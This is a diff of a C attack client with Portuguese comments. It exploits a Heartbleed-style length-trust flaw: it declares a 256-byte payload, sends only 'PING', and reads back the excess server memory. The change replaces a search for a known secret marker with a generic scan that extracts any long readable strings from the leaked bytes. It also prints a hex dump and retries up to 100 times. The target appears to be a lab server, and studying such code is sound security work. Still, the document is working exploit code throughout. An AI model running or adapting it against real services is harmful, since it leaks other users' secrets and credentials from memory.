@@ -11,19 +11,18 @@
 #define SERVER_PORT 9090
 #define DECLARED_SIZE 256
 #define MAX_ATTEMPTS 100
-
-/*
- * O atacante conhece apenas um marcador generico,
- * nao o conteudo completo armazenado pelo servidor.
- */
-#define SECRET_MARKER "SEGREDO:"
+#define MIN_INTERESTING_SEQUENCE 20
 
 static void fail(const char *message) {
     perror(message);
     exit(EXIT_FAILURE);
 }
 
-static ssize_t send_all(int socket_fd, const void *buffer, size_t size) {
+static ssize_t send_all(
+    int socket_fd,
+    const void *buffer,
+    size_t size
+) {
     size_t sent = 0;
 
     while (sent < size) {
@@ -44,7 +43,11 @@ static ssize_t send_all(int socket_fd, const void *buffer, size_t size) {
     return (ssize_t)sent;
 }
 
-static ssize_t receive_all(int socket_fd, void *buffer, size_t size) {
+static ssize_t receive_all(
+    int socket_fd,
+    void *buffer,
+    size_t size
+) {
     size_t received = 0;
 
     while (received < size) {
@@ -65,27 +68,10 @@ static ssize_t receive_all(int socket_fd, void *buffer, size_t size) {
     return (ssize_t)received;
 }
 
-static ssize_t find_marker(
+static void print_memory(
     const unsigned char *buffer,
-    size_t buffer_size,
-    const char *marker
+    size_t size
 ) {
-    size_t marker_size = strlen(marker);
-
-    if (marker_size > buffer_size) {
-        return -1;
-    }
-
-    for (size_t i = 0; i <= buffer_size - marker_size; i++) {
-        if (memcmp(buffer + i, marker, marker_size) == 0) {
-            return (ssize_t)i;
-        }
-    }
-
-    return -1;
-}
-
-static void print_memory(const unsigned char *buffer, size_t size) {
     printf("\nConteudo vazado em hexadecimal:\n");
 
     for (size_t i = 0; i < size; i++) {
@@ -105,23 +91,54 @@ static void print_memory(const unsigned char *buffer, size_t size) {
     printf("\n");
 }
 
-static void print_leaked_secret(
+static ssize_t find_interesting_sequence(
     const unsigned char *buffer,
     size_t buffer_size,
-    size_t start
+    size_t *sequence_size
 ) {
-    printf("Conteudo descoberto: ");
+    size_t start = 0;
+    size_t current_size = 0;
 
-    for (size_t i = start; i < buffer_size; i++) {
-        if (buffer[i] == '\0') {
-            break;
-        }
-
+    /*
+     * Ignora o payload PING e procura uma sequencia longa
+     * de caracteres legiveis nos bytes excedentes.
+     */
+    for (size_t i = 4; i < buffer_size; i++) {
         if (isprint(buffer[i])) {
-            putchar(buffer[i]);
+            if (current_size == 0) {
+                start = i;
+            }
+
+            current_size++;
+
+            if (current_size >= MIN_INTERESTING_SEQUENCE) {
+                while (
+                    start + current_size < buffer_size &&
+                    isprint(buffer[start + current_size])
+                ) {
+                    current_size++;
+                }
+
+                *sequence_size = current_size;
+                return (ssize_t)start;
+            }
         } else {
-            break;
+            current_size = 0;
         }
+    }
+
+    return -1;
+}
+
+static void print_discovered_sequence(
+    const unsigned char *buffer,
+    size_t start,
+    size_t sequence_size
+) {
+    printf("Sequencia legivel descoberta: ");
+
+    for (size_t i = 0; i < sequence_size; i++) {
+        putchar(buffer[start + i]);
     }
 
     printf("\n");
@@ -139,17 +156,25 @@ static int connect_to_server(void) {
     server_address.sin_family = AF_INET;
     server_address.sin_port = htons(SERVER_PORT);
 
-    if (inet_pton(AF_INET, SERVER_IP, &server_address.sin_addr) != 1) {
+    if (
+        inet_pton(
+            AF_INET,
+            SERVER_IP,
+            &server_address.sin_addr
+        ) != 1
+    ) {
         close(socket_fd);
         fprintf(stderr, "Endereco do servidor invalido.\n");
         exit(EXIT_FAILURE);
     }
 
-    if (connect(
+    if (
+        connect(
             socket_fd,
             (struct sockaddr *)&server_address,
             sizeof(server_address)
-        ) == -1) {
+        ) == -1
+    ) {
         close(socket_fd);
         fail("Erro ao conectar ao servidor");
     }
@@ -157,7 +182,7 @@ static int connect_to_server(void) {
     return socket_fd;
 }
 
-static ssize_t execute_attempt(unsigned char *response) {
+static int execute_attempt(unsigned char *response) {
     const char payload[] = "PING";
 
     uint16_t payload_size = (uint16_t)strlen(payload);
@@ -166,37 +191,53 @@ static ssize_t execute_attempt(unsigned char *response) {
 
     int socket_fd = connect_to_server();
 
-    if (send_all(
+    if (
+        send_all(
             socket_fd,
             &declared_size_network,
             sizeof(declared_size_network)
-        ) != sizeof(declared_size_network)) {
+        ) != sizeof(declared_size_network)
+    ) {
         close(socket_fd);
         fail("Erro ao enviar o tamanho declarado");
     }
 
-    if (send_all(
+    if (
+        send_all(
             socket_fd,
             &payload_size_network,
             sizeof(payload_size_network)
-        ) != sizeof(payload_size_network)) {
+        ) != sizeof(payload_size_network)
+    ) {
         close(socket_fd);
         fail("Erro ao enviar o tamanho real");
     }
 
-    if (send_all(socket_fd, payload, payload_size) != payload_size) {
+    if (
+        send_all(
+            socket_fd,
+            payload,
+            payload_size
+        ) != payload_size
+    ) {
         close(socket_fd);
         fail("Erro ao enviar o payload");
     }
 
-    if (receive_all(socket_fd, response, DECLARED_SIZE) != DECLARED_SIZE) {
+    if (
+        receive_all(
+            socket_fd,
+            response,
+            DECLARED_SIZE
+        ) != DECLARED_SIZE
+    ) {
         close(socket_fd);
         fail("Erro ao receber a resposta");
     }
 
     close(socket_fd);
 
-    return find_marker(response, DECLARED_SIZE, SECRET_MARKER);
+    return EXIT_SUCCESS;
 }
 
 int main(void) {
@@ -207,17 +248,33 @@ int main(void) {
     }
 
     for (int attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
-        printf("Tentativa %d de %d...\n", attempt, MAX_ATTEMPTS);
+        printf(
+            "Tentativa %d de %d...\n",
+            attempt,
+            MAX_ATTEMPTS
+        );
 
-        ssize_t marker_position = execute_attempt(response);
+        execute_attempt(response);
 
-        if (marker_position >= 0) {
-            printf("\nMarcador de dado sensivel encontrado na tentativa %d!\n", attempt);
+        size_t sequence_size = 0;
 
-            print_leaked_secret(
+        ssize_t sequence_position =
+            find_interesting_sequence(
                 response,
                 DECLARED_SIZE,
-                (size_t)marker_position
+                &sequence_size
+            );
+
+        if (sequence_position >= 0) {
+            printf(
+                "\nPossivel dado sensivel encontrado na tentativa %d!\n",
+                attempt
+            );
+
+            print_discovered_sequence(
+                response,
+                (size_t)sequence_position,
+                sequence_size
             );
 
             print_memory(response, DECLARED_SIZE);
@@ -226,10 +283,14 @@ int main(void) {
             return EXIT_SUCCESS;
         }
 
-        printf("Nenhum dado sensivel identificado nesta resposta.\n");
+        printf(
+            "Nenhuma sequencia relevante encontrada nesta resposta.\n"
+        );
     }
 
-    printf("\nLimite de tentativas atingido sem encontrar o segredo.\n");
+    printf(
+        "\nLimite de tentativas atingido sem identificar dados legiveis.\n"
+    );
 
     free(response);
 
